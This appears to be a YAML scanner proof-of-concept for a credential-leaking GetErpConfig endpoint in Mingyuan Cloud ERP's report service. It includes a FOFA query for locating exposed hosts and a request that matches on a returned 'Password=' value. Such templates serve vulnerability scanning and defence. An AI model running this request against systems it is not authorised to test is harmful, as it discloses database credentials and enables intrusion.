id: poc-yaml-mingyuanyun-erp-report-service-geterpconfig-info-leak
info:
  name: 明源云ERP报表服务 GetErpConfig 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 明源云ERP报表服务系统
  fofa: body="报表服务已正常运行"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"报表服务已正常运行")
- method: GET
  path: /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60
  expression: 'status_code == 200 &&

    contains(body,"\"ErpKey\":\"erp60\"") &&

    contains(body,"Password=") &&

    contains(content_type,"application/json")

    '
variables: {}
transport: http
